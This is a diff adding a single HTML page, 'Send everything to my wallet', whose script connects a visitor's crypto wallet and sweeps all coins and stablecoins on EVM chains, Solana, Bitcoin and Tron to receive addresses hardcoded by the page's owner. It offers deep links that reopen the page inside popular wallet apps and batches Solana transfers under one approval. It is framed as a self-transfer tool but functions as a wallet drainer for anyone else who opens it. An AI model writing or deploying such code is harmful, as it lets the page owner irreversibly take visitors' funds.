@@ -1,0 +1,276 @@
+ <!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>god is blessee</title>
+<style>
+  :root{--bg:#f3f5f2;--ink:#14231c;--mute:#5d6b63;--card:#fff;--accent:#0f6b4f;--line:#d9dfda;--bad:#b3261e;--on:#fff}
+  @media (prefers-color-scheme:dark){:root{--bg:#0e1612;--ink:#e8efe9;--mute:#9aa8a0;--card:#17211b;--accent:#4fd1a1;--line:#27352d;--bad:#ff8a80;--on:#06281c}}
+  *{box-sizing:border-box}
+  html,body{margin:0;background:var(--bg);color:var(--ink);font-family:Georgia,"Times New Roman",serif}
+  body{padding:env(safe-area-inset-top,0) 18px env(safe-area-inset-bottom,0)}
+  main{max-width:460px;margin:0 auto;padding:30px 0}
+  h1{font-size:28px;margin:0 0 6px}h2{font-size:17px;margin:22px 0 10px}
+  p.sub{color:var(--mute);margin:0 0 18px;line-height:1.5}
+  .chips{display:flex;gap:8px;overflow-x:auto;padding-bottom:10px;margin-bottom:6px}
+  .chip{flex:none;width:auto;font-size:15px;padding:9px 14px;border-radius:999px;background:transparent;color:var(--ink);border:1px solid var(--line);margin:0}
+  .chip.on{background:var(--accent);color:var(--on);border-color:var(--accent)}
+  .card{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:16px;margin-bottom:14px}
+  .row{display:flex;justify-content:space-between;gap:12px;font-size:15px;padding:6px 0}
+  .row span:first-child{color:var(--mute);flex:none}
+  .mono{font-family:ui-monospace,Menlo,monospace;font-size:13.5px;word-break:break-all;text-align:right}
+  button{width:100%;font:inherit;font-size:18px;padding:16px;border-radius:12px;border:0;background:var(--accent);color:var(--on);cursor:pointer;margin-top:10px}
+  button.ghost{background:transparent;color:var(--ink);border:1px solid var(--line);font-size:15px;padding:12px}
+  button:disabled{opacity:.5}
+  button:focus-visible,input:focus-visible{outline:3px solid var(--ink);outline-offset:2px}
+  input{width:100%;font:inherit;font-size:15px;padding:12px;border-radius:10px;border:1px solid var(--line);background:var(--card);color:var(--ink);margin-top:8px}
+  .grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}.grid button{margin:0}
+  #msg{min-height:22px;margin:10px 0;font-size:15px;line-height:1.5;word-break:break-word}.err{color:var(--bad)}
+</style>
+</head>
+<body>
+<main>
+  <h1>Send everything to my wallet</h1>
+  <p class="sub">Pick a network and tap once. Every coin and token found is sent to your saved address for that network. You approve in your wallet.</p>
+
+  <div class="chips" id="chips"></div>
+
+  <div class="card">
+    <div class="row"><span id="lbl">Sending to</span><span class="mono" id="dest"></span></div>
+    <div class="row"><span>From</span><span class="mono" id="from">Not connected</span></div>
+    <div class="row"><span>Balance</span><span class="mono" id="bal">-</span></div>
+    <input id="custom" placeholder="Extra token contract (optional)" style="display:none">
+    <button id="send"></button>
+  </div>
+  <div id="msg"></div>
+
+  <h2>Open in a wallet app</h2>
+  <p class="sub" style="margin-bottom:10px">A normal phone browser has no wallet. Tap an app to reopen this page inside it.</p>
+  <div class="grid" id="apps"></div>
+  <button class="ghost" id="copylink">Copy page link (for any other wallet)</button>
+</main>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.4/ethers.umd.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
+<script>
+// ================= EDIT THESE: your receiving wallets =================
+// Networks that use the same address type (all EVM chains) can share one address.
+const Ethereum_Receive  = "Ethereum_Receive";   // 0x...
+const BNB_Receive       = "BNB_Receive";        // 0x... (can be same as Ethereum_Receive)
+const Polygon_Receive   = "Polygon_Receive";    // 0x...
+const Arbitrum_Receive  = "Arbitrum_Receive";   // 0x...
+const Base_Receive      = "Base_Receive";       // 0x...
+const Optimism_Receive  = "Optimism_Receive";   // 0x...
+const Avalanche_Receive = "Avalanche_Receive";  // 0x...
+const Solana_Receive    = "Solana_Receive";     // Solana address
+const Bitcoin_Receive   = "Bitcoin_Receive";    // bc1... or 1... / 3...
+const Tron_Receive      = "Tron_Receive";       // T...
+const SOLANA_RPC = "https://api.mainnet-beta.solana.com"; // swap for your own RPC if rate-limited
+// =====================================================================
+
+// buf = fee safety margin in % so "send all" never fails on fee changes
+const CHAINS = [
+  {id:"eth",name:"Ethereum",sym:"ETH",fam:"evm",cid:1,rcv:Ethereum_Receive,lbl:"Ethereum_Receive",buf:120},
+  {id:"bnb",name:"BNB Chain",sym:"BNB",fam:"evm",cid:56,rcv:BNB_Receive,lbl:"BNB_Receive",buf:120},
+  {id:"pol",name:"Polygon",sym:"POL",fam:"evm",cid:137,rcv:Polygon_Receive,lbl:"Polygon_Receive",buf:150},
+  {id:"arb",name:"Arbitrum",sym:"ETH",fam:"evm",cid:42161,rcv:Arbitrum_Receive,lbl:"Arbitrum_Receive",buf:200},
+  {id:"base",name:"Base",sym:"ETH",fam:"evm",cid:8453,rcv:Base_Receive,lbl:"Base_Receive",buf:200},
+  {id:"op",name:"Optimism",sym:"ETH",fam:"evm",cid:10,rcv:Optimism_Receive,lbl:"Optimism_Receive",buf:200},
+  {id:"avax",name:"Avalanche",sym:"AVAX",fam:"evm",cid:43114,rcv:Avalanche_Receive,lbl:"Avalanche_Receive",buf:120},
+  {id:"sol",name:"Solana",sym:"SOL",fam:"sol",rcv:Solana_Receive,lbl:"Solana_Receive"},
+  {id:"btc",name:"Bitcoin",sym:"BTC",fam:"btc",rcv:Bitcoin_Receive,lbl:"Bitcoin_Receive"},
+  {id:"trx",name:"Tron",sym:"TRX",fam:"trx",rcv:Tron_Receive,lbl:"Tron_Receive"},
+];
+// Popular stablecoins swept automatically on EVM (paste any other token contract in the optional box)
+const TOKENS = {
+  eth:["0xdAC17F958D2ee523a2206206994597C13D831ec7","0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"],
+  bnb:["0x55d398326f99059fF775485246999027B3197955","0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"],
+  pol:["0xc2132D05D31c914a87C6611C10748AEb04B58e8F","0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359"],
+  arb:["0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9","0xaf88d065e77c8cC2239327C5EDb3A432268e5831"],
+  base:["0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"],
+};
+const TRX_TOKENS = ["TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"]; // USDT (TRC-20)
+const ERC20 = ["function balanceOf(address) view returns (uint256)","function symbol() view returns (string)","function transfer(address,uint256) returns (bool)"];
+const TOKEN_PROG = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
+const ATA_PROG = new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
+
+const $ = id => document.getElementById(id);
+const msg = (t, bad) => { $("msg").textContent = t; $("msg").className = bad ? "err" : ""; };
+const short = a => a.length > 16 ? a.slice(0,8)+"…"+a.slice(-6) : a;
+const fmt = (n, d=6) => Number(n).toFixed(d);
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+const validators = {
+  evm: a => ethers.isAddress(a),
+  sol: a => /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(a),
+  btc: a => /^(bc1[a-z0-9]{25,62}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})$/.test(a),
+  trx: a => /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(a),
+};
+
+let cur = CHAINS[0], account = null, provider = null, signer = null, balance = 0n;
+const ok = () => validators[cur.fam](cur.rcv);
+const same = (a, b) => a.toLowerCase() === b.toLowerCase();
+
+function selectChain(c){
+  cur = c; account = null; provider = signer = null; balance = 0n;
+  try { localStorage.setItem("lastChain", c.id); } catch {}
+  document.querySelectorAll(".chip").forEach(b => b.classList.toggle("on", b.dataset.id === c.id));
+  $("lbl").textContent = c.lbl; $("dest").textContent = ok() ? short(c.rcv) : "Not set";
+  $("from").textContent = "Not connected"; $("bal").textContent = "-";
+  $("custom").value = ""; $("custom").style.display = (c.fam === "evm" || c.fam === "trx") ? "block" : "none";
+  $("send").textContent = "Send everything to " + c.lbl; $("send").disabled = !ok();
+  msg(ok() ? "" : "Replace " + c.lbl + " in the code with your real address.", !ok());
+}
+CHAINS.forEach(c => { const b = document.createElement("button"); b.className = "chip"; b.textContent = c.name; b.dataset.id = c.id; b.onclick = () => selectChain(c); $("chips").appendChild(b); });
+
+// ---------- connect ----------
+async function connect(){
+  if (cur.fam === "evm"){
+    if (!window.ethereum) throw new Error("No EVM wallet here. Use the wallet app buttons below.");
+    await window.ethereum.request({method:"eth_requestAccounts"});
+    try { await window.ethereum.request({method:"wallet_switchEthereumChain",params:[{chainId:"0x"+cur.cid.toString(16)}]}); }
+    catch { throw new Error("Add the " + cur.name + " network in your wallet, then try again."); }
+    provider = new ethers.BrowserProvider(window.ethereum); signer = await provider.getSigner(); account = await signer.getAddress();
+  }
+  if (cur.fam === "sol"){
+    const p = window.phantom?.solana || window.solana; if (!p) throw new Error("Open this page in Phantom.");
+    account = (await p.connect()).publicKey.toString();
+  }
+  if (cur.fam === "btc"){
+    if (!window.unisat) throw new Error("Bitcoin needs the Unisat wallet. Open this page in its browser.");
+    account = (await window.unisat.requestAccounts())[0];
+  }
+  if (cur.fam === "trx"){
+    if (!window.tronLink) throw new Error("Open this page in TronLink or Trust Wallet's browser.");
+    await window.tronLink.request({method:"tron_requestAccounts"}); account = window.tronWeb.defaultAddress.base58;
+  }
+  if (same(account, cur.rcv)) { account = null; throw new Error("You're already on your saved wallet. Switch to the wallet you want to send from."); }
+}
+
+async function refresh(){
+  if (cur.fam === "evm"){ balance = await provider.getBalance(account); $("bal").textContent = fmt(ethers.formatEther(balance)) + " " + cur.sym; }
+  if (cur.fam === "sol"){ balance = BigInt(await new solanaWeb3.Connection(SOLANA_RPC).getBalance(new solanaWeb3.PublicKey(account))); $("bal").textContent = fmt(Number(balance)/1e9) + " SOL"; }
+  if (cur.fam === "btc"){ balance = BigInt((await window.unisat.getBalance()).confirmed); $("bal").textContent = fmt(Number(balance)/1e8, 8) + " BTC"; }
+  if (cur.fam === "trx"){ balance = BigInt(await window.tronWeb.trx.getBalance(account)); $("bal").textContent = fmt(Number(balance)/1e6) + " TRX"; }
+  $("from").textContent = short(account);
+}
+
+// ---------- sweepers: each returns a list of what was sent ----------
+async function sweepEvm(){
+  const out = [], list = [...(TOKENS[cur.id] || [])], extra = $("custom").value.trim();
+  if (ethers.isAddress(extra)) list.push(extra);
+  for (const a of list){                       // tokens first, native coin last (it pays the fees)
+    const c = new ethers.Contract(a, ERC20, signer);
+    let b; try { b = await c.balanceOf(account); } catch { continue; }
+    if (b === 0n) continue;
+    const sym = await c.symbol().catch(() => "token");
+    msg("Approve the " + sym + " transfer in your wallet…");
+    const tx = await c.transfer(cur.rcv, b); await tx.wait(); out.push(sym);
+  }
+  await refresh();
+  const fee = await provider.getFeeData(), perGas = fee.maxFeePerGas ?? fee.gasPrice;
+  const gas = await provider.estimateGas({from:account, to:cur.rcv, value:1n}).catch(() => 21000n);
+  const value = balance - (gas * perGas * BigInt(cur.buf)) / 100n;
+  if (value > 0n){
+    msg("Approve the " + cur.sym + " transfer in your wallet…");
+    const tx = await signer.sendTransaction({to:cur.rcv, value, gasLimit:gas}); await tx.wait(); out.push(cur.sym);
+  } else if (!out.length) throw new Error("Balance too low to cover the network fee.");
+  return out;
+}
+
+async function sweepSol(){
+  const {PublicKey:PK, Transaction:Tx, TransactionInstruction:Ix, SystemProgram:SP} = solanaWeb3;
+  const p = window.phantom?.solana || window.solana, conn = new solanaWeb3.Connection(SOLANA_RPC);
+  const owner = new PK(account), dest = new PK(cur.rcv);
+  const r = await conn.getParsedTokenAccountsByOwner(owner, {programId: TOKEN_PROG});
+  const toks = r.value.map(v => ({pubkey: v.pubkey, ...v.account.data.parsed.info})).filter(i => Number(i.tokenAmount.amount) > 0);
+  const bh = (await conn.getLatestBlockhash()).blockhash, txs = [], out = [];
+  const m = (pubkey, isSigner, isWritable) => ({pubkey, isSigner, isWritable});
+  let rent = 0;
+  for (let i = 0; i < toks.length; i += 3){    // 3 tokens per transaction
+    const t = new Tx();
+    for (const k of toks.slice(i, i + 3)){
+      const mint = new PK(k.mint), ata = PK.findProgramAddressSync([dest.toBuffer(), TOKEN_PROG.toBuffer(), mint.toBuffer()], ATA_PROG)[0];
+      if (!(await conn.getAccountInfo(ata))) rent += 2039280;
+      const data = new Uint8Array(10); data[0] = 12; new DataView(data.buffer).setBigUint64(1, BigInt(k.tokenAmount.amount), true); data[9] = k.tokenAmount.decimals;
+      t.add(
+        new Ix({programId:ATA_PROG, keys:[m(owner,true,true),m(ata,false,true),m(dest,false,false),m(mint,false,false),m(SP.programId,false,false),m(TOKEN_PROG,false,false)], data:new Uint8Array([1])}),
+        new Ix({programId:TOKEN_PROG, keys:[m(k.pubkey,false,true),m(mint,false,false),m(ata,false,true),m(owner,true,false)], data})
+      );
+      out.push("SPL token");
+    }
+    t.feePayer = owner; t.recentBlockhash = bh; txs.push(t);
+  }
+  const lamports = Number(balance) - rent - 5000 * (txs.length + 1);
+  if (lamports > 0){
+    const t = new Tx().add(SP.transfer({fromPubkey:owner, toPubkey:dest, lamports}));
+    t.feePayer = owner; t.recentBlockhash = bh; txs.push(t); out.push("SOL");
+  }
+  if (!txs.length) throw new Error("Nothing to send (balance too low for fees).");
+  msg("Approve once in Phantom…");
+  const signed = await p.signAllTransactions(txs);   // a single approval covers everything
+  for (const s of signed){ const sig = await conn.sendRawTransaction(s.serialize()); await conn.confirmTransaction(sig, "confirmed"); }
+  return out;
+}
+
+async function sweepBtc(){
+  let rate = 0; try { rate = (await fetch("https://mempool.space/api/v1/fees/recommended").then(r => r.json())).halfHourFee; } catch {}
+  const reserve = rate ? Math.max(1000, Math.ceil(rate * 250)) : 3000;   // sats kept back for the fee
+  const sats = Number(balance) - reserve; if (sats <= 546) throw new Error("Balance too low to cover the fee.");
+  msg("Approve in Unisat…");
+  await window.unisat.sendBitcoin(cur.rcv, sats, rate ? {feeRate: rate} : undefined);
+  return ["BTC"];
+}
+
+async function sweepTrx(){
+  const out = [], list = [...TRX_TOKENS], extra = $("custom").value.trim();
+  if (validators.trx(extra)) list.push(extra);
+  for (const a of list){
+    let c, b; try { c = await window.tronWeb.contract().at(a); b = BigInt((await c.balanceOf(account).call()).toString()); } catch { continue; }
+    if (b === 0n) continue;
+    const sym = await c.symbol().call().catch(() => "token");
+    msg("Approve the " + sym + " transfer in your wallet…");
+    await c.transfer(cur.rcv, b.toString()).send({feeLimit: 100000000}); out.push(sym); await sleep(5000);
+  }
+  await refresh();
+  const sun = Number(balance) - 1000000;       // keep 1 TRX back for the fee
+  if (sun > 0){
+    msg("Approve the TRX transfer in your wallet…");
+    const r = await window.tronWeb.trx.sendTransaction(cur.rcv, sun);
+    if (!r.result) throw new Error("Transaction rejected."); out.push("TRX");
+  } else if (!out.length) throw new Error("Balance too low to cover the fee.");
+  return out;
+}
+const SWEEP = {evm: sweepEvm, sol: sweepSol, btc: sweepBtc, trx: sweepTrx};
+
+// ---------- the one button ----------
+$("send").onclick = async () => {
+  try {
+    if (!ok()) return;
+    $("send").disabled = true;
+    if (!account){ msg("Connecting…"); await connect(); }
+    await refresh();
+    const sent = await SWEEP[cur.fam]();
+    msg("Done. Sent: " + sent.join(", ") + ". Funds can take a minute to arrive.");
+    setTimeout(() => refresh().catch(() => {}), 6000);
+  } catch(e){ msg(e.code === "ACTION_REJECTED" ? "Cancelled in wallet." : (e.shortMessage || e.message), true); }
+  finally { $("send").disabled = !ok(); }
+};
+
+// ---------- master link: reopen this page inside wallet apps ----------
+const page = location.href.split("#")[0], enc = encodeURIComponent(page);
+const APPS = [
+  ["MetaMask","https://metamask.app.link/dapp/" + page.replace(/^https?:\/\//,"")],
+  ["Trust Wallet","https://link.trustwallet.com/open_url?coin_id=60&url=" + enc],
+  ["Coinbase Wallet","https://go.cb-w.com/dapp?cb_url=" + enc],
+  ["Phantom","https://phantom.app/ul/browse/" + enc + "?ref=" + encodeURIComponent(location.origin)],
+  ["OKX Wallet","okx://wallet/dapp/url?dappUrl=" + enc],
+];
+APPS.forEach(([n,u]) => { const b = document.createElement("button"); b.className = "ghost"; b.textContent = n; b.onclick = () => { location.href = u; }; $("apps").appendChild(b); });
+$("copylink").onclick = async () => { try { await navigator.clipboard.writeText(page); msg("Link copied. Paste it in your wallet's browser."); } catch { msg(page); } };
+
+let last = null; try { last = localStorage.getItem("lastChain"); } catch {}
+selectChain(CHAINS.find(c => c.id === last) || CHAINS[0]);
+</script>
+</body>
+</html>
